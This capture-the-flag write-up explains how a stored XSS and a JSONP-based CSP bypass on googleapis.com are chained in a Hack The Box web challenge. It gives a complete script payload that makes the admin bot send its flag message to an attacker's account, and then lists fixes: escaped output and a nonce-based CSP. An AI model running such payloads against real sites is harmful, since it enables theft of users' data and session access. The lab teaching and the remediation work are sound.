# HTB Web Challenge — "Massagold" — Writeup

**Target:** `http://localhost:8081`
**Category:** Web / Stored XSS & CSP Bypass (JSONP Script Gadget)
**Stack:** Node.js, Express, EJS, SQLite, Playwright (Admin Bot)

---

## Summary

The challenge consists of a message-board web application where users can send messages to other accounts. If a message is sent to the `admin` account, an automated admin bot (simulating a victim) logs in and views the message. 

Two vulnerabilities are chained to achieve remote code execution in the victim's browser and exfiltrate the flag:
1. **Stored XSS**: The template rendering message contents uses EJS raw output (`<%-`), which does not sanitize HTML or script tags.
2. **CSP Bypass via JSONP**: A restrictive Content Security Policy blocks inline scripts but allowlists `https://www.googleapis.com`. By using Google's Custom Search API as a "script gadget," an attacker can pass JavaScript inside the `callback` parameter. The API reflects the parameter value in a `text/javascript` response, allowing arbitrary code to run under the whitelisted domain context.

---

## Vulnerability Analysis

### 1. Identifying Stored XSS
In `/app/views/message.ejs`, the content of the message is rendered using the raw EJS output tag (`<%-`):
```html
<pre class="letter-copy"><%- message.content %></pre>
```
Because the template uses `<%-` instead of `<%=`, any HTML sent in the message body is parsed and rendered by the browser rather than being sanitized or escaped.

### 2. Auditing the Content Security Policy
The server defines a strict Content Security Policy in `/app/server.js`:
```javascript
res.setHeader(
  'Content-Security-Policy',
  [
    "default-src 'self'",
    "script-src 'self' https://www.googleapis.com",
    ...
  ].join('; ')
);
```
Since `'unsafe-inline'` is not present, simple inline scripts like `<script>alert(1)</script>` are blocked by the browser. However, `https://www.googleapis.com` is explicitly whitelisted for script sources.

### 3. Locating a Script Gadget on `googleapis.com`
To bypass the CSP, we must load a script from `https://www.googleapis.com` that executes dynamic JavaScript. 

Google's Custom Search API supports JSONP callback execution:
```http
GET https://www.googleapis.com/customsearch/v1?callback=<PAYLOAD>
```

When this endpoint receives a request, it returns a `200 OK` response with a `text/javascript` content type. Even if the callback name fails Google's internal validation, the endpoint still reflects the parameter verbatim in the response:
```javascript
// API callback
<PAYLOAD>({
  "error": { ... }
});
```
Because the script comes from a whitelisted host, the browser downloads and executes it.

---

## Step-by-Step Walkthrough

### Step 1: Analyze the Database Seeding
From `entrypoint.js`, we see that the flag is stored as a message sent by the `archivist` to the `admin` user. Since this is the first message created during database initialization, it receives `id = 1`. 

Our goal is to read the content of `/messages/1` using the admin's session and exfiltrate it.

### Step 2: Evade Script Encoding Constraints
The Google API server encodes/escapes angle brackets (e.g., `>` becomes `\u003e`), which invalidates ES6 arrow functions like `r => r.text()`. To ensure the payload executes cleanly, write the payload using traditional JavaScript functions:
```javascript
fetch('/messages/1')
  .then(function(r){ return r.text(); })
  .then(function(t){
     // Parse the HTML document to isolate the flag container
     var doc = new DOMParser().parseFromString(t, 'text/html');
     var flag = doc.querySelector('.letter-copy').textContent;
     
     // Send the flag to our user account via the message system
     fetch('/messages', {
       method: 'POST',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: 'to_username=attacker_username&content=' + encodeURIComponent(flag)
     });
  });
```

### Step 3: Trigger the Exploit
1. Register a new user account (e.g., `attacker_username`).
2. Construct the `<script>` tag referencing the JSONP endpoint:
   ```html
   <script src="https://www.googleapis.com/customsearch/v1?callback=fetch('/messages/1').then(function(r){return r.text()}).then(function(t){var doc=new DOMParser().parseFromString(t,'text/html');var flag=doc.querySelector('.letter-copy').textContent;fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to_username=attacker_username&content='+encodeURIComponent(flag)})})"></script>
   ```
3. Send this payload as a message to the `admin` user.
4. When the admin bot loads the message, the script fires, fetches the flag page, parses the flag, and posts it back to `attacker_username`'s inbox.
5. Log in as `attacker_username` and view the new incoming message to collect the flag.

---

## Defensive Remediations

### 1. Escape User-Supplied Output
Modify the message view template to sanitize output before rendering:
```diff
-        <pre class="letter-copy"><%- message.content %></pre>
+        <pre class="letter-copy"><%= message.content %></pre>
```

### 2. Implement Nonce-Based CSP
Instead of allowlisting third-party hostnames (which might serve dynamic files or JSONP callbacks), configure a nonce-based policy. Generate a unique cryptographic token (nonce) per request and require it on all valid script tags:
```javascript
// server.js
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${res.locals.nonce}';`
  );
  next();
});
```
```html
<!-- head.ejs -->
<script nonce="<%= nonce %>" src="/assets/message.js" defer></script>
```
